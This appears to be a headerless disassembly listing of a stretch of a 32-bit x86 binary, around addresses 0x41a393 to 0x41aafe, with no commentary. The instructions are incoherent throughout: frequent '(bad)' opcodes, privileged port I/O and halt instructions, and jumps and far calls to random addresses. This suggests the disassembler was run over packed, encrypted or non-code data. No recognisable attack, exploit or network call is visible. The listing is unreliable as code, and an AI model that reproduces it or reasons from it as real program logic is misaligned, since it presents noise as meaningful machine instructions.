  41a393:	push   ds
  41a394:	add    esi,DWORD PTR [ecx-0x6]
  41a397:	xchg   esp,eax
  41a398:	mov    edi,0xbc65ee9d
  41a39d:	sub    DWORD PTR [esi+0x2a3f3e2a],eax
  41a3a3:	cdq    
  41a3a4:	or     DWORD PTR [esi-0x794813],edi
  41a3aa:	cmc    
  41a3ab:	xlat   BYTE PTR ds:[ebx]
  41a3ac:	and    dh,dh
  41a3ae:	out    0x0,eax
  41a3b0:	jmp    0x8645cea0
  41a3b5:	xchg   DWORD PTR [ebp-0x1c25e98d],ebx
  41a3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3bc:	push   ds
  41a3bd:	xchg   esp,eax
  41a3be:	sub    DWORD PTR [eax],ecx
  41a3c0:	test   ah,al
  41a3c2:	sar    BYTE PTR [ecx+0x26],0xb3
  41a3c6:	loopne 0x41a386
  41a3c8:	jo     0x41a43a
  41a3ca:	dec    esp
  41a3cb:	inc    ecx
  41a3cc:	fidiv  DWORD PTR [eax]
  41a3ce:	fstp   QWORD PTR [edx-0x46]
  41a3d1:	and    ah,BYTE PTR [esi]
  41a3d3:	shr    BYTE PTR [esi+0x12],cl
  41a3d6:	mov    esp,0xfdb76a94
  41a3db:	test   al,0x9f
  41a3dd:	dec    ecx
  41a3de:	mov    edi,0x8aa74b88
  41a3e3:	add    al,0x64
  41a3e5:	cmp    ecx,edi
  41a3e7:	sub    eax,0x9d570347
  41a3ec:	mov    esp,0xb635b95a
  41a3f1:	pop    ecx
  41a3f2:	scas   al,BYTE PTR es:[edi]
  41a3f3:	xor    ch,BYTE PTR [edx+esi*2]
  41a3f6:	jmp    0x4c52d59d
  41a3fb:	sub    dh,BYTE PTR [esi]
  41a3fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3fe:	xor    BYTE PTR [esi-0xd],cl
  41a401:	pop    ds
  41a402:	js     0x41a3f0
  41a404:	loope  0x41a46f
  41a406:	jecxz  0x41a41a
  41a408:	pop    ss
  41a409:	jno    0x41a3e2
  41a40b:	in     al,0x6
  41a40d:	(bad)  
  41a40e:	out    dx,eax
  41a40f:	or     bl,0xef
  41a412:	hlt    
  41a413:	jmp    0xb9d2ab6f
  41a418:	pop    eax
  41a419:	dec    eax
  41a41a:	stc    
  41a41b:	jecxz  0x41a444
  41a41d:	repz push ecx
  41a41f:	popf   
  41a420:	enter  0xa100,0x87
  41a424:	mov    ah,0xde
  41a426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a427:	inc    edi
  41a428:	jge    0x41a43f
  41a42a:	inc    ecx
  41a42b:	and    dl,BYTE PTR [ecx+edi*4-0x65]
  41a42f:	cwde   
  41a430:	adc    eax,0xce8b8bc0
  41a435:	xlat   BYTE PTR ds:[ebx]
  41a436:	or     eax,0x27cc49ed
  41a43b:	and    al,0x9c
  41a43d:	xor    edx,DWORD PTR [edx-0x6]
  41a440:	mov    cl,0x7a
  41a442:	sar    DWORD PTR [ebx],1
  41a444:	loopne 0x41a452
  41a446:	ret    
  41a447:	(bad)  
  41a448:	arpl   WORD PTR [edi+0x655917fe],di
  41a44e:	push   esi
  41a44f:	repz sbb DWORD PTR [edx+0x8],ebx
  41a453:	push   cs
  41a454:	push   ecx
  41a455:	xchg   ebx,eax
  41a456:	sbb    BYTE PTR [ebx],dl
  41a458:	loop   0x41a473
  41a45a:	inc    edi
  41a45b:	sbb    BYTE PTR [ecx+0x1011583],ch
  41a461:	xchg   ecx,eax
  41a462:	call   0xc686:0x9600bb97
  41a469:	sbb    al,0x3f
  41a46b:	pop    ss
  41a46c:	xor    eax,0x2d09752e
  41a471:	fwait
  41a472:	js     0x41a43e
  41a474:	test   BYTE PTR [edi],0x0
  41a477:	out    dx,eax
  41a478:	dec    edi
  41a479:	hlt    
  41a47a:	arpl   WORD PTR [ebx-0xc],dx
  41a47d:	ret    
  41a47e:	adc    DWORD PTR [ebx+0x6b],edi
  41a481:	popf   
  41a482:	xchg   esi,eax
  41a483:	iret   
  41a484:	xchg   ecx,eax
  41a485:	sub    al,0xfd
  41a487:	fwait
  41a488:	leave  
  41a489:	(bad)  
  41a48a:	loopne 0x41a464
  41a48c:	pop    edx
  41a48d:	fstp   QWORD PTR [esi]
  41a48f:	jns    0x41a41e
  41a491:	xchg   ah,dh
  41a493:	ins    BYTE PTR es:[edi],dx
  41a494:	cmc    
  41a495:	loop   0x41a4d9
  41a497:	jp     0x41a4c0
  41a499:	mov    bh,dl
  41a49b:	jecxz  0x41a4fa
  41a49d:	pop    ebp
  41a49e:	jns    0x41a4a2
  41a4a0:	sbb    ebx,edi
  41a4a2:	pop    edi
  41a4a3:	and    dl,BYTE PTR [edi+edx*8]
  41a4a6:	sti    
  41a4a7:	ins    DWORD PTR es:[edi],dx
  41a4a8:	dec    eax
  41a4a9:	mov    bh,0xb5
  41a4ab:	mov    bh,BYTE PTR [edi+0x3ab8bf72]
  41a4b1:	sahf   
  41a4b2:	scas   al,BYTE PTR es:[edi]
  41a4b3:	shr    DWORD PTR [edx],1
  41a4b5:	(bad)
  41a4b8:	stos   BYTE PTR es:[edi],al
  41a4b9:	cmp    eax,0xbb1df5df
  41a4be:	fild   WORD PTR [ecx]
  41a4c0:	ret    0x6b84
  41a4c3:	xor    DWORD PTR [ebx+0x2efbdf44],edi
  41a4c9:	mov    eax,ds:0x856900c2
  41a4ce:	loopne 0x41a4e9
  41a4d0:	and    bl,BYTE PTR [ebx+eiz*2+0xc]
  41a4d4:	adc    DWORD PTR [esi-0x342ca5f7],0x3616f37a
  41a4de:	xchg   ebp,eax
  41a4df:	mov    al,0xd6
  41a4e1:	jne    0x41a471
  41a4e3:	push   cs
  41a4e4:	lahf   
  41a4e5:	inc    edi
  41a4e6:	(bad)  
  41a4e7:	dec    ebx
  41a4e8:	cmp    dl,BYTE PTR [ebx+eax*8]
  41a4eb:	mov    ds:0x583100f4,al
  41a4f0:	adc    BYTE PTR [ecx+0x21191721],0x97
  41a4f7:	data16 jb 0x41a514
  41a4fa:	sbb    ebx,edi
  41a4fc:	ins    DWORD PTR es:[edi],dx
  41a4fd:	jg     0x41a4bd
  41a4ff:	adc    DWORD PTR [ecx+0x3db2aebb],ecx
  41a505:	into   
  41a506:	xor    al,BYTE PTR [esi]
  41a508:	test   al,0xeb
  41a50a:	mov    ch,0x37
  41a50c:	inc    ebx
  41a50d:	inc    esp
  41a50e:	mov    eax,0xef5cd5b7
  41a513:	(bad)  
  41a514:	cli    
  41a515:	out    dx,al
  41a516:	push   ebp
  41a517:	call   0x867c:0x2c3311c1
  41a51e:	mov    esi,0x58f0433f
  41a523:	adc    eax,0x8180bb0b
  41a528:	retf   
  41a529:	mov    ch,0x23
  41a52b:	aaa    
  41a52c:	pop    ebp
  41a52d:	out    dx,eax
  41a52e:	pop    es
  41a52f:	cwde   
  41a530:	inc    edi
  41a531:	mov    WORD PTR [edx-0x175ba9ed],gs
  41a537:	mov    esi,ss
  41a539:	sbb    eax,DWORD PTR [ebp+0x3cfa9143]
  41a53f:	pop    ss
  41a540:	and    dl,bh
  41a542:	mov    ebx,0xb735e65
  41a547:	jno    0x41a5b5
  41a549:	(bad)  
  41a54b:	fmul   DWORD PTR ds:0xf80069b0
  41a551:	push   ebx
  41a552:	mov    dh,0x4c
  41a554:	(bad)  
  41a555:	aad    0xe
  41a557:	test   DWORD PTR ds:0x307adf5,ebx
  41a55d:	mov    eax,ds:0x4833d1a5
  41a562:	cli    
  41a563:	sub    bl,BYTE PTR [eax+edx*2]
  41a566:	test   al,0x9b
  41a568:	sbb    BYTE PTR [ebp-0x6faf8cff],ch
  41a56e:	js     0x41a533
  41a570:	cmp    BYTE PTR [edx+0x37],dh
  41a573:	out    dx,eax
  41a574:	pop    edx
  41a575:	(bad)  
  41a576:	nop
  41a577:	scas   eax,DWORD PTR es:[edi]
  41a578:	ins    DWORD PTR es:[edi],dx
  41a579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a57a:	sbb    ecx,DWORD PTR [ebp-0x36]
  41a57d:	mov    DWORD PTR [ebx],eax
  41a57f:	test   eax,0x3ca7f804
  41a584:	out    0xb1,eax
  41a586:	out    dx,al
  41a587:	sub    BYTE PTR [edx+eax*8],0xc1
  41a58b:	cwde   
  41a58c:	dec    ebx
  41a58d:	cwde   
  41a58e:	and    DWORD PTR [ebp+ebp*1+0x3e2808dd],ebx
  41a595:	sub    DWORD PTR [ebp-0x64dfc19c],ebp
  41a59b:	aad    0x7
  41a59d:	xchg   ebx,eax
  41a59e:	xchg   edi,eax
  41a59f:	inc    edx
  41a5a0:	dec    esi
  41a5a1:	or     al,0x5d
  41a5a3:	mov    dl,0xdb
  41a5a5:	sbb    eax,0x541bef2e
  41a5aa:	xchg   esi,eax
  41a5ab:	(bad)  
  41a5ad:	jp     0x41a581
  41a5af:	or     al,0x61
  41a5b1:	ds push esp
  41a5b3:	adc    BYTE PTR [ebx-0x6e],0xd8
  41a5b7:	pop    DWORD PTR [edi]
  41a5b9:	dec    esi
  41a5ba:	lods   eax,DWORD PTR ds:[esi]
  41a5bb:	shl    DWORD PTR [ecx-0x20],1
  41a5be:	cs fs (bad) 
  41a5c1:	bnd jmp 0xc799426c
  41a5c7:	inc    edx
  41a5c8:	ror    BYTE PTR [ebx+eiz*2],cl
  41a5cb:	jg     0x41a5c9
  41a5cd:	enter  0x4fcb,0xfc
  41a5d1:	ret    
  41a5d2:	iret   
  41a5d3:	rcl    DWORD PTR [ecx-0x75],0x76
  41a5d7:	aaa    
  41a5d8:	cld    
  41a5d9:	lock add al,0x1c
  41a5dc:	jp     0x41a641
  41a5de:	mov    ecx,0xd21b1f5e
  41a5e3:	lea    ebx,[ebx]
  41a5e5:	inc    ebx
  41a5e6:	inc    edi
  41a5e7:	dec    esi
  41a5e8:	cmp    BYTE PTR [ebx+ecx*4+0x1b35cf8d],al
  41a5ef:	jle    0x41a623
  41a5f1:	add    bh,bl
  41a5f3:	shr    DWORD PTR [esi],0x61
  41a5f6:	scas   eax,DWORD PTR es:[edi]
  41a5f7:	pop    esi
  41a5f8:	push   ecx
  41a5f9:	cld    
  41a5fa:	mov    dh,0x79
  41a5fc:	dec    BYTE PTR [edx]
  41a5fe:	xchg   ecx,eax
  41a5ff:	push   ebx
  41a600:	mov    edx,0x92e0772d
  41a605:	js     0x41a65d
  41a607:	sub    DWORD PTR [edi],esp
  41a609:	ror    DWORD PTR [ecx-0x80],1
  41a60c:	sbb    bh,BYTE PTR [eax-0x709ea039]
  41a612:	test   BYTE PTR [ecx-0x47db2aa0],dh
  41a618:	cli    
  41a619:	adc    DWORD PTR [ecx-0x73f7fd81],ebx
  41a61f:	inc    ecx
  41a620:	cwde   
  41a621:	cmp    BYTE PTR ds:0xe199cea,bh
  41a627:	out    0x91,al
  41a629:	ins    BYTE PTR es:[edi],dx
  41a62a:	pop    esi
  41a62b:	pop    ds
  41a62c:	push   ebp
  41a62d:	dec    ecx
  41a62e:	push   ss
  41a62f:	fdivr  DWORD PTR [esi-0x35eb1db2]
  41a635:	push   es
  41a636:	stos   DWORD PTR es:[edi],eax
  41a637:	popa   
  41a638:	fnstcw WORD PTR [ecx+edx*1]
  41a63b:	fnstsw WORD PTR [ebx-0x5d]
  41a63e:	retf   0xb573
  41a641:	ffree  st(7)
  41a643:	xor    DWORD PTR [edi+0x3b],eax
  41a646:	jne    0x41a6bd
  41a648:	mov    edi,0x4a856fdc
  41a64d:	(bad)  
  41a64f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a650:	loop   0x41a667
  41a652:	add    BYTE PTR [eax+0x17b5724f],bl
  41a658:	cdq    
  41a659:	fidivr DWORD PTR [edi+0x58312c40]
  41a65f:	add    edi,DWORD PTR [eax-0x551890af]
  41a665:	and    BYTE PTR [edi-0x70fc3b06],ah
  41a66b:	sar    BYTE PTR [ebp+ebx*4-0x83299fb],1
  41a672:	outs   dx,BYTE PTR ds:[esi]
  41a673:	(bad)  
  41a674:	fwait
  41a675:	sbb    eax,0xdcf74617
  41a67a:	lea    edi,[ebx]
  41a67c:	cmp    eax,DWORD PTR [eax-0x3ffbe447]
  41a682:	xchg   dh,ah
  41a684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a685:	inc    ebx
  41a686:	data16 or dh,cl
  41a689:	and    eax,0x2d20b68e
  41a68e:	sbb    eax,0x1c814d07
  41a693:	ja     0x41a61f
  41a695:	and    ebp,edx
  41a697:	(bad)  
  41a698:	bound  ebp,QWORD PTR [ebx+edx*4]
  41a69b:	push   ebx
  41a69c:	out    dx,al
  41a69d:	sbb    cl,BYTE PTR [edi+0x564bcc1c]
  41a6a3:	add    DWORD PTR [edx],ebx
  41a6a5:	xor    al,0x5b
  41a6a7:	xchg   ebp,eax
  41a6a8:	cmp    edi,DWORD PTR ds:[esi]
  41a6ab:	mov    al,ds:0xe6f12ab9
  41a6b0:	int3   
  41a6b1:	std    
  41a6b2:	xor    esp,esi
  41a6b4:	jecxz  0x41a636
  41a6b6:	cmp    al,0xdc
  41a6b8:	mov    ebp,0xc19df50e
  41a6bd:	ret    0xed82
  41a6c0:	cld    
  41a6c1:	push   ebx
  41a6c2:	jl     0x41a73a
  41a6c4:	xor    BYTE PTR [edx-0x27],bl
  41a6c7:	out    dx,eax
  41a6c8:	cmp    ebx,DWORD PTR [edi-0x78]
  41a6cb:	(bad)  
  41a6cc:	fcom   QWORD PTR [eax+ebp*2+0x7871e7be]
  41a6d3:	mov    ds:0xec33a0d4,eax
  41a6d8:	loopne 0x41a72c
  41a6da:	adc    dl,BYTE PTR [eax]
  41a6dc:	test   eax,0xe32e401d
  41a6e1:	test   al,0x41
  41a6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e4:	jmp    0xfeb840b1
  41a6e9:	gs xchg edi,ebp
  41a6ec:	je     0x41a6e1
  41a6ee:	stos   DWORD PTR es:[edi],eax
  41a6ef:	test   al,0x3c
  41a6f1:	sbb    bl,0x85
  41a6f4:	pop    ebx
  41a6f5:	jl     0x41a743
  41a6f7:	data16 sbb al,0x2a
  41a6fa:	mov    ah,dh
  41a6fc:	fistp  WORD PTR ds:0x652bb570
  41a702:	xchg   edx,eax
  41a703:	jbe    0x41a708
  41a705:	in     eax,dx
  41a706:	or     esi,0x45
  41a709:	and    eax,0xe630ab63
  41a70e:	jp     0x41a70a
  41a710:	pop    ebx
  41a711:	pop    ss
  41a712:	adc    al,0xcd
  41a714:	jo     0x41a751
  41a716:	(bad)  
  41a717:	fisub  WORD PTR [ebx]
  41a719:	xchg   ebp,esp
  41a71b:	dec    ecx
  41a71c:	cwde   
  41a71d:	(bad)  
  41a71e:	retf   
  41a71f:	test   DWORD PTR [eax],esi
  41a721:	(bad)  
  41a722:	ss push 0xffffff8f
  41a725:	(bad)  
  41a726:	call   0x44c6d824
  41a72b:	popa   
  41a72c:	xchg   edi,eax
  41a72d:	out    dx,eax
  41a72e:	pop    ds
  41a72f:	push   esi
  41a730:	sub    DWORD PTR [ebp+0x2ebac0e3],0xffffffad
  41a737:	int3   
  41a738:	xchg   esi,eax
  41a739:	mov    bh,0xe0
  41a73b:	inc    ebx
  41a73c:	push   cs
  41a73d:	mov    cl,0xe1
  41a73f:	or     al,0xc4
  41a741:	loopne 0x41a77b
  41a743:	pop    es
  41a744:	sar    DWORD PTR ds:0xf4f77214,1
  41a74a:	or     al,0x77
  41a74c:	add    DWORD PTR [ecx+0x72],esp
  41a74f:	cmp    edi,ebp
  41a751:	cmc    
  41a752:	jo     0x41a6ea
  41a754:	jb     0x41a780
  41a756:	pusha  
  41a757:	rcr    BYTE PTR ds:0x43835858,1
  41a75d:	fild   DWORD PTR [edi]
  41a75f:	inc    edi
  41a760:	hlt    
  41a761:	xchg   edi,eax
  41a762:	push   0x466b44e2
  41a767:	inc    edx
  41a768:	mov    al,ds:0xd84a1e4c
  41a76d:	xlat   BYTE PTR ds:[ebx]
  41a76e:	push   esp
  41a76f:	loopne 0x41a730
  41a771:	or     DWORD PTR [esi],edx
  41a773:	mov    edi,0x6a5d9bf3
  41a778:	mov    cl,0xc3
  41a77a:	ins    DWORD PTR es:[edi],dx
  41a77b:	push   0xffffff99
  41a77d:	mov    eax,ds:0x2859f997
  41a782:	out    dx,eax
  41a783:	std    
  41a784:	mov    ds:0x85b18f2d,al
  41a789:	div    BYTE PTR [ecx-0x4a35329c]
  41a78f:	fsub   QWORD PTR [edx+0x79]
  41a792:	and    al,0xb4
  41a794:	and    dl,BYTE PTR [ebx-0x4db01e11]
  41a79a:	adc    dh,BYTE PTR [ebp+0x3c]
  41a79d:	sbb    dh,al
  41a79f:	jle    0x41a7ec
  41a7a1:	aaa    
  41a7a2:	inc    ebx
  41a7a3:	sbb    eax,0x321556e2
  41a7a8:	add    DWORD PTR [ecx],eax
  41a7aa:	mov    dl,0x50
  41a7ac:	sub    al,0x9
  41a7ae:	inc    edx
  41a7af:	dec    eax
  41a7b0:	stos   DWORD PTR es:[edi],eax
  41a7b1:	pop    ebx
  41a7b2:	clc    
  41a7b3:	ror    DWORD PTR [ecx+0x66],0x3d
  41a7b7:	rcl    edx,cl
  41a7b9:	mov    bh,0x38
  41a7bb:	push   ds
  41a7bc:	aad    0xdc
  41a7be:	fadd   QWORD PTR [ecx+ebp*8+0xab1691c]
  41a7c5:	sub    eax,0x95a4f35e
  41a7ca:	or     al,0x81
  41a7cc:	cwde   
  41a7cd:	sbb    bh,cl
  41a7cf:	jnp    0x41a787
  41a7d1:	ror    bl,0x6a
  41a7d4:	adc    eax,0xedf191f5
  41a7d9:	fsubr  DWORD PTR [edx+0x3857ab67]
  41a7df:	cdq    
  41a7e0:	xchg   DWORD PTR [ebp-0x29fd7104],eax
  41a7e6:	shl    DWORD PTR [eax],1
  41a7e8:	sub    al,0x6b
  41a7ea:	lods   eax,DWORD PTR ds:[esi]
  41a7eb:	sahf   
  41a7ec:	sbb    eax,0xcac98b2e
  41a7f1:	rol    DWORD PTR [eax],0xe4
  41a7f4:	fucomp st(3)
  41a7f6:	mov    ecx,0x5243301c
  41a7fb:	fild   QWORD PTR [ebx]
  41a7fd:	inc    ebp
  41a7fe:	push   es
  41a7ff:	jg     0x41a839
  41a801:	imul   ecx,DWORD PTR [eiz*1+0x17f24e5],0xb5814f3
  41a80c:	mov    ecx,0x4f1d1075
  41a811:	shl    BYTE PTR [ebx],cl
  41a813:	xchg   BYTE PTR fs:[edx],al
  41a816:	jl     0x41a7e7
  41a818:	xchg   esi,eax
  41a819:	push   es
  41a81a:	scas   eax,DWORD PTR es:[edi]
  41a81b:	inc    edx
  41a81c:	xor    DWORD PTR [ecx],esp
  41a81e:	fdivr  DWORD PTR [edi]
  41a820:	cdq    
  41a821:	inc    esi
  41a822:	call   0xc1d0:0xa749cbe5
  41a829:	in     al,0x1b
  41a82b:	or     ah,BYTE PTR [ecx+0x30e0c448]
  41a831:	mov    ch,0xa2
  41a833:	pushf  
  41a834:	(bad)  
  41a835:	sbb    ch,dl
  41a837:	das    
  41a838:	in     eax,dx
  41a839:	lods   eax,DWORD PTR ds:[esi]
  41a83a:	ja     0x41a8ae
  41a83c:	push   esp
  41a83d:	mul    DWORD PTR [edi-0x72]
  41a840:	fisttp WORD PTR [edi-0x17]
  41a843:	test   al,0x2c
  41a845:	stos   BYTE PTR es:[edi],al
  41a846:	and    BYTE PTR [ecx-0x645a17e],0x43
  41a84d:	mov    dl,0x74
  41a84f:	sub    dh,BYTE PTR [ebx+eax*1+0x45]
  41a853:	sub    ah,BYTE PTR [esi+0x0]
  41a856:	cmc    
  41a857:	push   ds
  41a858:	cmp    dh,BYTE PTR [edi-0x2b06f985]
  41a85e:	popa   
  41a85f:	or     ch,BYTE PTR [edi-0x75]
  41a862:	jnp    0x41a84a
  41a864:	scas   eax,DWORD PTR es:[edi]
  41a865:	fst    DWORD PTR [eax]
  41a867:	mov    dl,0xad
  41a869:	addr16 and al,0x37
  41a86c:	int    0x52
  41a86e:	(bad)  
  41a86f:	adc    BYTE PTR [ebx-0x2ae9d9bb],bl
  41a875:	push   eax
  41a876:	add    BYTE PTR [edx+0x163723fb],dl
  41a87c:	pop    ds
  41a87d:	xchg   eax,edx
  41a87f:	mov    eax,0x2ccc9bfa
  41a884:	push   esp
  41a885:	lahf   
  41a886:	sub    bl,BYTE PTR [eax+ebp*2+0x6f]
  41a88a:	push   es
  41a88b:	gs inc ebx
  41a88d:	shl    DWORD PTR [esi+0x43],cl
  41a890:	inc    ecx
  41a891:	imul   esp,ebx,0xd
  41a894:	call   0x22210dc9
  41a899:	stos   DWORD PTR es:[edi],eax
  41a89a:	(bad)
  41a89e:	mov    cl,0xee
  41a8a0:	lahf   
  41a8a1:	(bad)  
  41a8a2:	mov    eax,0xe36f987e
  41a8a7:	mov    ch,0xc3
  41a8a9:	push   es
  41a8aa:	mov    eax,0x701877c8
  41a8af:	fisttp QWORD PTR [ebx+0x4561c640]
  41a8b5:	mov    esp,0x4f5f7bf2
  41a8ba:	jb     0x41a929
  41a8bc:	jl     0x41a8ad
  41a8be:	je     0x41a85a
  41a8c0:	mov    dh,0x4c
  41a8c2:	(bad)  
  41a8c3:	js     0x41a900
  41a8c5:	adc    cl,BYTE PTR [esi-0x3]
  41a8c8:	inc    esp
  41a8c9:	and    esp,DWORD PTR [eax+0x1f7dc5fa]
  41a8cf:	ja     0x41a939
  41a8d1:	jne    0x41a8d8
  41a8d3:	cmc    
  41a8d4:	iret   
  41a8d5:	dec    esp
  41a8d6:	call   0x5e725318
  41a8db:	or     DWORD PTR ds:0xde55d72b,edi
  41a8e1:	cmp    BYTE PTR [edi+0x6c],cl
  41a8e4:	add    BYTE PTR es:[ebx-0xf2a8899],0x44
  41a8ec:	cmp    al,0x30
  41a8ee:	jg     0x41a95a
  41a8f0:	jo     0x41a8bf
  41a8f2:	pop    ebx
  41a8f3:	cli    
  41a8f4:	icebp  
  41a8f5:	(bad)  
  41a8f6:	outs   dx,DWORD PTR ds:[esi]
  41a8f7:	ja     0x41a91b
  41a8f9:	xor    ebp,eax
  41a8fb:	mov    ch,0x60
  41a8fd:	or     al,0xfb
  41a8ff:	mov    ch,0x50
  41a901:	dec    ebx
  41a902:	mov    ?,ecx
  41a904:	and    DWORD PTR [eax+0x34550285],0x1ba9854c
  41a90e:	xor    DWORD PTR [edx+0x5ab6560a],edx
  41a914:	shl    cl,0x89
  41a917:	cs inc edi
  41a919:	in     al,dx
  41a91a:	imul   edx,DWORD PTR [edi-0x4a3be95d],0xffffff81
  41a921:	out    0x61,al
  41a923:	cmp    eax,DWORD PTR [esi]
  41a925:	imul   ecx,DWORD PTR [esi+0x704ecf3e],0x244932b4
  41a92f:	inc    eax
  41a930:	mov    eax,0xedac9d3
  41a935:	mov    edx,0x9d61f4cc
  41a93a:	outs   dx,BYTE PTR ds:[esi]
  41a93b:	jmp    0xb032:0x4cbd3215
  41a942:	sar    BYTE PTR [edx+0x13ef55c9],1
  41a948:	jmp    0x41a918
  41a94a:	jno    0x41a8ec
  41a94c:	sub    BYTE PTR [esi],ch
  41a94e:	les    ebx,FWORD PTR [esi+eax*4+0x504c9955]
  41a955:	pop    ss
  41a956:	fs das 
  41a958:	adc    BYTE PTR ds:0x7258dc02,dl
  41a95e:	mov    esi,0xb9817630
  41a963:	push   0xf7f05266
  41a968:	add    BYTE PTR [ebx],ch
  41a96a:	xor    al,0x5e
  41a96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a96d:	xor    ebx,ecx
  41a96f:	mov    DWORD PTR [ebx],edx
  41a971:	int3   
  41a972:	pop    edi
  41a973:	out    dx,al
  41a974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a975:	mov    eax,ds:0x364a872
  41a97a:	dec    edx
  41a97b:	int    0xa3
  41a97d:	pop    esi
  41a97e:	das    
  41a97f:	add    al,0xcf
  41a981:	and    eax,0xdbadaec3
  41a986:	pop    ebx
  41a987:	mov    ecx,0xa3bddfcc
  41a98c:	pushf  
  41a98d:	adc    eax,0xa1666c16
  41a992:	aaa    
  41a993:	mov    cl,0xd4
  41a995:	cmp    ebp,edi
  41a997:	out    dx,al
  41a998:	loopne 0x41a99f
  41a99a:	adc    eax,0x445a368b
  41a99f:	in     eax,dx
  41a9a0:	or     al,0x7f
  41a9a2:	call   0x5ead49e7
  41a9a7:	pop    esi
  41a9a8:	ds inc esi
  41a9aa:	(bad)  
  41a9ab:	fcomi  st,st(3)
  41a9ad:	pop    ebp
  41a9ae:	outs   dx,DWORD PTR ds:[esi]
  41a9af:	repz mov edi,0xeb1c504b
  41a9b5:	jb     0x41a9d8
  41a9b7:	cli    
  41a9b8:	mov    ch,0xa7
  41a9ba:	inc    ebp
  41a9bb:	ret    
  41a9bc:	sahf   
  41a9bd:	cmp    DWORD PTR [edi],edi
  41a9bf:	xchg   esp,eax
  41a9c0:	jl     0x41a9d0
  41a9c2:	fidiv  DWORD PTR [edx-0x70912850]
  41a9c8:	adc    ch,BYTE PTR [eax-0x4c]
  41a9cb:	sbb    BYTE PTR [eax-0x4d],bl
  41a9ce:	push   ebx
  41a9cf:	cmp    al,0x38
  41a9d1:	mov    cl,0x52
  41a9d3:	popf   
  41a9d4:	lds    ecx,FWORD PTR ds:0x59902272
  41a9da:	inc    ebx
  41a9db:	fisttp WORD PTR [esi-0x78]
  41a9de:	adc    eax,DWORD PTR [edi-0x4f]
  41a9e1:	lahf   
  41a9e2:	bound  ebx,QWORD PTR [ebp-0x70]
  41a9e5:	rcl    ch,1
  41a9e7:	lock mov ds:0x598fbbb3,al
  41a9ed:	rcl    DWORD PTR [esi-0x4bc62023],cl
  41a9f3:	sub    eax,0x41c0d56b
  41a9f9:	pushf  
  41a9fa:	jmp    0xf1e8:0xeca0702b
  41aa01:	daa    
  41aa02:	rcr    BYTE PTR [ebp-0x57135053],1
  41aa08:	or     al,0xbc
  41aa0a:	clc    
  41aa0b:	aam    0x39
  41aa0d:	pop    ebx
  41aa0e:	push   es
  41aa0f:	pop    edx
  41aa10:	inc    esp
  41aa11:	and    BYTE PTR [eax+0x47c9cda6],dl
  41aa17:	lea    ebx,[esi-0x3063552a]
  41aa1d:	cmp    ebx,ebp
  41aa1f:	mov    ch,0xf
  41aa21:	ds pop ss
  41aa23:	jae    0x41aa98
  41aa25:	fwait
  41aa26:	pop    es
  41aa27:	fdiv   QWORD PTR [edi-0x45]
  41aa2a:	data16 jmp 0x41a9d2
  41aa2d:	cmp    DWORD PTR [esi+0x52],eax
  41aa30:	(bad)  
  41aa31:	mov    ds:0xb31700fd,al
  41aa36:	(bad)  
  41aa37:	sub    DWORD PTR [ebx],esp
  41aa39:	sub    BYTE PTR [ecx+edi*4],bl
  41aa3c:	add    BYTE PTR [ecx],0xa5
  41aa3f:	test   DWORD PTR [esi],edx
  41aa41:	xchg   ch,al
  41aa43:	mov    eax,DWORD PTR [edi+edi*8]
  41aa46:	ret    0x6d8a
  41aa49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4a:	or     eax,0xe70a8e3c
  41aa4f:	lods   eax,DWORD PTR ds:[esi]
  41aa50:	xor    al,0xff
  41aa52:	sbb    BYTE PTR [edi-0x6f],ah
  41aa55:	fsubr  st(1),st
  41aa57:	sti    
  41aa58:	call   0xda58ab95
  41aa5d:	cli    
  41aa5e:	pop    DWORD PTR [edx-0xf9e917b]
  41aa64:	(bad)  
  41aa65:	sub    eax,0x22127895
  41aa6a:	in     eax,0xae
  41aa6c:	sbb    DWORD PTR [ecx-0x33],edx
  41aa6f:	cmp    al,0xf0
  41aa71:	int3   
  41aa72:	(bad)  
  41aa73:	gs imul ebx,edx,0x4283ff30
  41aa7a:	rcr    cl,0xa6
  41aa7d:	sti    
  41aa7e:	push   esp
  41aa7f:	push   ebp
  41aa80:	out    0x9e,al
  41aa82:	jmp    0x74ab6085
  41aa87:	lods   eax,DWORD PTR ds:[esi]
  41aa88:	sbb    dl,BYTE PTR [esi-0x1cb9ee37]
  41aa8e:	shr    ebx,0x4d
  41aa91:	push   ecx
  41aa92:	add    eax,0xf15623a1
  41aa97:	mov    ds:0x479dab90,al
  41aa9c:	(bad)  
  41aa9e:	repz (bad) 
  41aaa0:	call   FWORD PTR [ebx-0x18]
  41aaa3:	jb     0x41aae8
  41aaa5:	cmp    BYTE PTR [esi+0x29680143],al
  41aaab:	repz mov edx,0x447d3d90
  41aab1:	xchg   esp,eax
  41aab2:	test   BYTE PTR [eax-0x59],al
  41aab5:	ss cmp bl,bl
  41aab8:	push   esp
  41aab9:	jge    0x41aae0
  41aabb:	dec    ebp
  41aabc:	pop    ss
  41aabd:	shr    BYTE PTR [ebx+edi*8-0x241df3f6],1
  41aac4:	(bad)  
  41aac5:	bound  esp,QWORD PTR [esi]
  41aac7:	jnp    0x41aad2
  41aac9:	mov    ebx,0x3c0bf327
  41aace:	and    edi,DWORD PTR [ecx+edi*4-0x36f5547]
  41aad5:	and    dl,0x4e
  41aad8:	jo     0x41aae2
  41aada:	ror    DWORD PTR ds:0x44466b1a,1
  41aae0:	pop    esi
  41aae1:	pushf  
  41aae2:	push   eax
  41aae3:	mov    dh,0xb
  41aae5:	mov    bh,0x84
  41aae7:	cmp    DWORD PTR ds:0x2d0b92b8,0x4d36e715
  41aaf1:	scas   al,BYTE PTR es:[edi]
  41aaf2:	jle    0x41ab25
  41aaf4:	add    eax,DWORD PTR [edx]
  41aaf6:	clc    
  41aaf7:	cmp    al,0xea
  41aaf9:	jb     0x41ab7a
  41aafb:	sub    esp,DWORD PTR [ecx]
  41aafd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aafe:	rol    BYTE PTR [esi+0x1085fbe1],1
